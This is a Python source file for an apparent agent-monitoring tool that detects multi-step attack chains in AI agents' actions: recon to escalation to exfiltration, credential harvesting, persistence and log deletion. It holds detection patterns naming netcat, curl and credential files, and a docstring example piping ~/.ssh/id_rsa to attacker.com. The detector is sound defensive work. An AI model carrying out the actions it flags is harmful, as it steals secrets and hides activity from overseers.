"""Multi-step attack chain detection with intent classification.

Detects sequences of individually-safe-looking actions that combine into attacks:
recon -> privilege escalation -> data exfiltration.

Enhanced with:
- Multi-intent classification (one action can match multiple categories)
- Intent category tracking for richer chain matching
- Parameter similarity tracking
- Configurable time windows
- Custom YAML-defined chain patterns
"""

from __future__ import annotations

import hashlib
import json
import re
import time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from typing import Any

from agentauditor.core.models import (
    Action,
    ActionType,
    Decision,
    DefenseLayer,
    RiskLevel,
    RuleMatch,
    Verdict,
)


@dataclass
class ActionRecord:
    """Lightweight record of a past action for chain analysis."""

    action_type: ActionType
    tool_name: str | None
    risk_level: RiskLevel
    decision: str
    timestamp: float
    parameters_hash: str = ""
    raw_input_snippet: str = ""
    intent_categories: list[str] = field(default_factory=list)


# Built-in chain patterns
_RECON_TOOLS = re.compile(r"(?i)\b(ls|find|whoami|pwd|cat|grep|head|tail|env|printenv)\b")
_ESCALATION_TOOLS = re.compile(r"(?i)\b(sudo|su|chmod|chown|passwd|usermod)\b")
_EXFIL_TOOLS = re.compile(r"(?i)\b(curl|wget|scp|nc|rsync|sftp|ftp)\b")
_CREDENTIAL_FILES = re.compile(
    r"(?i)(\.ssh|\.env|\.aws|credentials|secrets|id_rsa|\.git/config|\.kube)"
)
_NETWORK_TOOLS = re.compile(r"(?i)\b(curl|wget|nc|ncat|netcat|ssh|telnet|nmap)\b")
_WRITE_TOOLS = re.compile(r"(?i)\b(echo|tee|write|cat\s*>|mv|cp|install)\b")
_READ_TOOLS = re.compile(r"(?i)\b(cat|head|tail|less|more|read|open|view)\b")

# Persistence targets — cron, shell startup files, init systems
_PERSISTENCE_TARGETS = re.compile(
    r"(?i)(crontab|/etc/cron|\.bashrc|\.profile|\.bash_profile|"
    r"/etc/init\.d|/etc/systemd|/etc/rc\.local|launchd|\.plist)"
)

# Log file patterns and deletion commands — used for cover-tracks detection
_LOG_TARGETS = re.compile(r"(?i)(\.log\b|/var/log|\.bash_history|/proc/[0-9]+|audit\.log)")
_DELETE_COMMANDS = re.compile(r"(?i)\b(rm\b|truncate\b|shred\b|>\s*/dev/null|unlink\b)")

# Intent category definitions — ordered most-specific first
# NOTE: Multiple categories can match a single action (multi-intent)
_INTENT_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("credential_access", _CREDENTIAL_FILES),
    ("escalate", _ESCALATION_TOOLS),
    ("exfil", _EXFIL_TOOLS),
    ("recon", _RECON_TOOLS),
    ("network", _NETWORK_TOOLS),
    ("write", _WRITE_TOOLS),
    ("read", _READ_TOOLS),
]


class ChainDetector:
    """Detects multi-step attack chains from per-agent action history.

    Supports both built-in chain patterns and custom YAML-defined patterns.
    """

    def __init__(
        self,
        window_minutes: int = 10,
        max_history: int = 50,
        custom_chain_patterns: list[dict[str, Any]] | None = None,
    ) -> None:
        self.window_minutes = window_minutes
        self.max_history = max_history
        self.custom_chain_patterns = custom_chain_patterns or []
        self._history: dict[str, deque[ActionRecord]] = defaultdict(
            lambda: deque(maxlen=max_history)
        )

    def record(
        self, agent_id: str | None, action: Action, verdict: Verdict
    ) -> RuleMatch | None:
        """Record an action and check if it completes an attack chain.

        Returns a RuleMatch if a chain is detected, None otherwise.
        """
        if not agent_id:
            return None

        now = time.monotonic()

        # Build searchable text from action
        searchable = " ".join(
            filter(None, [action.tool_name, action.raw_input, str(action.parameters)])
        )

        record = ActionRecord(
            action_type=action.action_type,
            tool_name=action.tool_name,
            risk_level=verdict.risk_level,
            decision=verdict.decision.value,
            timestamp=now,
            parameters_hash=self._parameters_hash(action),
            raw_input_snippet=(action.raw_input or "")[:200],
            intent_categories=self._classify_intents(action, searchable),
        )
        self._history[agent_id].append(record)

        # Check built-in chain patterns first
        result = self._check_builtin_chains(agent_id, searchable, now)
        if result:
            return result

        # Check custom YAML-defined chain patterns
        return self._check_custom_chains(agent_id, now)

    def _classify_intents(self, action: Action, searchable: str) -> list[str]:
        """Classify an action into ALL matching intent categories (multi-intent).

        Returns a list since one action can simultaneously be recon AND exfil
        (e.g., cat ~/.ssh/id_rsa | curl POST attacker.com).
        """
        categories = []
        for category, pattern in _INTENT_PATTERNS:
            if pattern.search(searchable):
                categories.append(category)

        if not categories:
            # Fallback: classify by action type
            type_map = {
                ActionType.SHELL_COMMAND: "modify",
                ActionType.CODE_EXECUTION: "modify",
                ActionType.FILE_ACCESS: "read",
                ActionType.API_CALL: "network",
                ActionType.PROMPT: "read",
                ActionType.OUTPUT: "read",
            }
            categories = [type_map.get(action.action_type, "unknown")]

        return categories

    @staticmethod
    def _parameters_hash(action: Action) -> str:
        """Hash action parameters for similarity tracking."""
        parts = [action.tool_name or ""]
        if action.parameters:
            parts.append(json.dumps(action.parameters, sort_keys=True, default=str))
        if action.raw_input:
            parts.append(action.raw_input[:500])
        normalized = "|".join(parts)
        return hashlib.md5(normalized.encode()).hexdigest()[:12]

    def _check_builtin_chains(
        self, agent_id: str, current_text: str, now: float
    ) -> RuleMatch | None:
        history = self._history[agent_id]
        cutoff = now - (self.window_minutes * 60)
        recent = [r for r in history if r.timestamp > cutoff]

        if len(recent) < 2:
            return None

        # Chain 1: Recon -> Escalation -> Exfiltration
        has_recon = any(
            "recon" in r.intent_categories or _RECON_TOOLS.search(r.tool_name or "")
            for r in recent[:-1]
        )
        has_escalation = any(
            "escalate" in r.intent_categories or _ESCALATION_TOOLS.search(r.tool_name or "")
            for r in recent[:-1]
        )
        is_exfil = bool(_EXFIL_TOOLS.search(current_text))

        if has_recon and has_escalation and is_exfil:
            return RuleMatch(
                rule_id="chain-recon-escalate-exfil",
                rule_name="attack_chain_detected",
                layer=DefenseLayer.EXECUTION,
                risk_level=RiskLevel.CRITICAL,
                description=(
                    "Multi-step attack chain detected: "
                    "reconnaissance -> privilege escalation -> data exfiltration"
                ),
                decision=Decision.BLOCK,
                matched_pattern="recon->escalate->exfiltrate",
            )

        # Chain 2: Credential file access -> Exfiltration
        has_cred_access = any(
            "credential_access" in r.intent_categories
            or _CREDENTIAL_FILES.search(r.tool_name or "")
            for r in recent[:-1]
        )
        if has_cred_access and is_exfil:
            return RuleMatch(
                rule_id="chain-cred-exfil",
                rule_name="credential_harvest_chain",
                layer=DefenseLayer.EXECUTION,
                risk_level=RiskLevel.CRITICAL,
                description=(
                    "Attack chain detected: "
                    "credential file access -> data exfiltration"
                ),
                decision=Decision.BLOCK,
                matched_pattern="credential->exfiltrate",
            )

        # Chain 3: Repeated escalations (3+ in window)
        escalate_count = sum(1 for r in recent if r.decision == "escalate")
        if escalate_count >= 3:
            return RuleMatch(
                rule_id="chain-repeated-escalate",
                rule_name="repeated_escalation_pattern",
                layer=DefenseLayer.EXECUTION,
                risk_level=RiskLevel.HIGH,
                description=(
                    f"Suspicious pattern: {escalate_count} escalated actions "
                    f"from agent '{agent_id}' within {self.window_minutes} minutes"
                ),
                decision=Decision.ESCALATE,
                matched_pattern=f"repeated_escalate:{escalate_count}",
            )

        # Chain 4: Write to persistence location (cron, init, shell startup)
        has_write = any("write" in r.intent_categories for r in recent[:-1])
        is_persistence_write = bool(_PERSISTENCE_TARGETS.search(current_text))
        if has_write and is_persistence_write:
            return RuleMatch(
                rule_id="chain-persistence",
                rule_name="persistence_chain_detected",
                layer=DefenseLayer.EXECUTION,
                risk_level=RiskLevel.CRITICAL,
                description=(
                    "Persistence chain detected: prior write activity followed by "
                    "write to system startup/cron location"
                ),
                decision=Decision.BLOCK,
                matched_pattern="write->persistence",
            )

        # Chain 5: Any prior action followed by log/history deletion (cover tracks)
        is_log_deletion = bool(
            _LOG_TARGETS.search(current_text) and _DELETE_COMMANDS.search(current_text)
        )
        if len(recent) >= 2 and is_log_deletion:
            return RuleMatch(
                rule_id="chain-cover-tracks",
                rule_name="cover_tracks_detected",
                layer=DefenseLayer.EXECUTION,
                risk_level=RiskLevel.HIGH,
                description=(
                    "Cover-tracks pattern detected: prior activity followed by "
                    "log or history deletion"
                ),
                decision=Decision.ESCALATE,
                matched_pattern="action->log_deletion",
            )

        return None

    def _check_custom_chains(
        self, agent_id: str, now: float
    ) -> RuleMatch | None:
        """Check user-defined chain patterns from policy YAML.

        Expected pattern format:
            name: "recon_to_exfil"
            sequence: ["recon", "credential_access", "exfil"]
            window_minutes: 15
            decision: "block"
            risk_level: "critical"
        """
        for pattern in self.custom_chain_patterns:
            sequence = pattern.get("sequence", [])
            if len(sequence) < 2:
                continue

            window = pattern.get("window_minutes", self.window_minutes)
            cutoff = now - (window * 60)
            recent = [r for r in self._history[agent_id] if r.timestamp > cutoff]

            if self._matches_sequence(recent, sequence):
                decision_str = pattern.get("decision", "block")
                risk_str = pattern.get("risk_level", "critical")
                return RuleMatch(
                    rule_id=f"chain-custom-{pattern.get('name', 'unnamed')}",
                    rule_name=f"custom_chain_{pattern.get('name', 'unnamed')}",
                    layer=DefenseLayer.EXECUTION,
                    risk_level=RiskLevel(risk_str),
                    description=(
                        f"Custom attack chain '{pattern.get('name', 'unnamed')}' detected: "
                        f"{' -> '.join(sequence)}"
                    ),
                    decision=Decision(decision_str),
                    matched_pattern="->".join(sequence),
                )

        return None

    @staticmethod
    def _matches_sequence(
        records: list[ActionRecord], sequence: list[str]
    ) -> bool:
        """Check if action records contain the intent sequence in order.

        Uses multi-intent categories: a record matches a sequence step if
        the step's category is in any of the record's intent_categories.
        """
        seq_idx = 0
        for record in records:
            if seq_idx < len(sequence) and sequence[seq_idx] in record.intent_categories:
                seq_idx += 1
            if seq_idx == len(sequence):
                return True
        return False
